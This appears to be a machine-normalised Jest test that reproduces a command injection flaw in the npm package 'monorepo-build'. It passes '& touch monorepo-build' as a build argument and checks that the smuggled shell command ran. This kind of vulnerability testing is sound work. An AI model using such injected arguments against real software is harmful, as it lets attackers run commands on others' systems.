const v53 = done => {
    const v28 = expect.assertions(2);
    v28;
    var a = require('monorepo-build');
    const fs = require('fs');
    const path = './monorepo-build';
    const v29 = require('child_process');
    var execSync = v29.execSync;
    var user_name = '';
    var user_email = '';
    try {
        const cmd = 'git config user.email';
        const v30 = execSync(cmd);
        const v31 = v30.toString();
        user_email = v31.trim();
    } catch (error) {
    }
    try {
        const cmd = 'git config user.name';
        const v32 = execSync(cmd);
        const v33 = v32.toString();
        user_name = v33.trim();
    } catch (error) {
    }
    try {
        const v34 = fs.existsSync(path);
        if (v34) {
            const v35 = fs.unlinkSync(path);
            v35;
            const v36 = console.log('File removed:', path);
            v36;
        }
    } catch (err) {
        const v37 = console.error(err);
        v37;
    }
    file_exist = fs.existsSync(path);
    const v38 = expect(file_exist);
    const v39 = v38.toBe(false);
    v39;
    try {
        const v40 = a.build('./', '& touch monorepo-build');
        v40;
    } catch (error) {
        const v41 = console.log('syntax-error');
        v41;
    }
    file_exist = fs.existsSync(path);
    const v42 = expect(file_exist);
    const v43 = v42.toBe(true);
    v43;
    const v51 = function (err) {
        try {
            const cmd = `git config user.name "${ user_name }"`;
            const v44 = execSync(cmd);
            const v45 = v44.toString();
            v45;
        } catch (error) {
            const v46 = console.log(error);
            v46;
        }
        try {
            const cmd = `git config user.email "${ user_email }"`;
            const v47 = execSync(cmd);
            const v48 = v47.toString();
            v48;
        } catch (error) {
            const v49 = console.log(error);
            v49;
        }
        const v50 = done();
        v50;
    };
    const v52 = fs.unlink(path, v51);
    v52;
};
const v54 = test('Command Injection in monorepo-build', v53);
v54;